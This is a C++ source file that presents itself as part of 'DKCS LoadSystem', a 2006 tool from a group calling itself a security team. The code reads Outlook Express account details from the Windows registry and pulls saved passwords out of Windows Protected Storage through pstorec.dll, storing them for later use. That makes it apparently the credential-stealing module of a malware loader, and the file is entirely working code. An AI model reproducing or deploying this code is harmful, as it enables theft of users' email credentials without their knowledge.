//-----------------------------------------------------------------
// this file is a part of: DKCS LoadSystem v. 0.1a
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
// Special work for Panda
//-----------------------------------------------------------------
#import "pstorec.dll"
//-----------------------------------------------------------------
using namespace PSTORECLib; 
//-----------------------------------------------------------------
HWND hwndlistview;
BOOL iS9x=FALSE;
//-----------------------------------------------------------------
typedef struct TOOUTDATA{
    char POPuser[100];
    char POPpass[100];
	char SMTPdisp[100];
	char SMTPmail[100];
	char SMTPserver[100];
}
OOUTDATA;
OOUTDATA OutlookData[50];
//-----------------------------------------------------------------
void EnumOutlookAccounts(){

	long l=0,i=0;
    char name[200],skey[200];
	DWORD dw2;
    FILETIME f;
    
    ZeroMemory(OutlookData,sizeof(OutlookData));
    HKEY hkeyresult ,hkeyresult1;
    lstrcpy(skey,"Software\\Microsoft\\Internet Account Manager\\Accounts");
    LONG lResult=RegOpenKeyEx(HKEY_CURRENT_USER, ( LPCTSTR ) skey,0,KEY_ALL_ACCESS, &hkeyresult1 );
	if(ERROR_SUCCESS != lResult){
		return ;
	}
    BYTE Data[150];
    DWORD size;
    DWORD type=REG_BINARY;
    while(l!=ERROR_NO_MORE_ITEMS){
        dw2=200;
        l=RegEnumKeyEx(hkeyresult1,i,name,&dw2,NULL,NULL,NULL,&f);
        lstrcpy(skey,"Software\\Microsoft\\Internet Account Manager\\Accounts");
        lstrcat(skey,"\\");
        lstrcat(skey,name);
        RegOpenKeyEx(HKEY_CURRENT_USER, (LPCTSTR)skey, 0, KEY_ALL_ACCESS, &hkeyresult);
        size=sizeof(Data);
		if(RegQueryValueEx(hkeyresult, (LPCTSTR)"POP3 User Name" , 0, &type, Data, &size)==ERROR_SUCCESS){
            lstrcpy(OutlookData[0].POPuser,(char *)Data);
            ZeroMemory(Data,sizeof(Data));
            size=sizeof(Data);
            RegQueryValueEx(hkeyresult, (LPCTSTR)"SMTP Server" , 0, &type, Data, &size);
            lstrcpy(OutlookData[0].SMTPserver,(char*)Data);
			ZeroMemory(Data,sizeof(Data));
            size=sizeof(Data);
			RegQueryValueEx(hkeyresult, (LPCTSTR)"SMTP Display Name" , 0, &type, Data, &size);
			lstrcpy(OutlookData[0].SMTPdisp,(char*)Data);
			ZeroMemory(Data,sizeof(Data));
            size=sizeof(Data);
			RegQueryValueEx(hkeyresult, (LPCTSTR)"SMTP Email Address" , 0, &type, Data, &size);
			lstrcpy(OutlookData[0].SMTPmail,(char*)Data);
			ZeroMemory(Data,sizeof(Data));
        }
        i++;
    }
}
//-----------------------------------------------------------------
typedef HRESULT (WINAPI *PStoreCreateInstancePtr)(IPStore **, DWORD, DWORD, DWORD); 
//-----------------------------------------------------------------
void EnumPStorage(BOOL Save){
	int i=0;
	HRESULT hRes;
	HMODULE hPstoreDLL = LoadLibrary("pstorec.dll");
	PStoreCreateInstancePtr PStoreCreateInstance = (PStoreCreateInstancePtr)GetProcAddress(hPstoreDLL, "PStoreCreateInstance");
	IPStorePtr spPStore;
	hRes = PStoreCreateInstance(&spPStore, 0, 0, 0);
	IEnumPStoreTypesPtr spEnumTypes;
	hRes = spPStore->EnumTypes(0, 0, &spEnumTypes);
	GUID typeGUID;
	char	sex[10];
	while(spEnumTypes->raw_Next(1,&typeGUID,0) == S_OK){
		wsprintf(sex, "%.8x", typeGUID);
		if(lstrcmp(sex,"220d5cc1") == 0){
			IEnumPStoreTypesPtr spEnumSubTypes;
			hRes = spPStore->EnumSubtypes(0, &typeGUID, 0, &spEnumSubTypes);
			GUID subtypeGUID;
			while(spEnumSubTypes->raw_Next(1,&subtypeGUID,0) == S_OK){
				IEnumPStoreItemsPtr spEnumItems;
				HRESULT hRes = spPStore->EnumItems(0, &typeGUID, &subtypeGUID, 0, &spEnumItems);
				LPWSTR itemName;
				while(spEnumItems->raw_Next(1,&itemName,0) == S_OK){
					unsigned long pcbData = 0;
					unsigned char *ppbData = NULL;
					_PST_PROMPTINFO *pi = NULL;
					hRes = spPStore->ReadItem(0,&typeGUID,&subtypeGUID,itemName,&pcbData,&ppbData,pi,0);
					wsprintf(OutlookData[0].POPpass,"%s",ppbData);
					i++;
				}
			}
		}
	}
}
//-----------------------------------------------------------------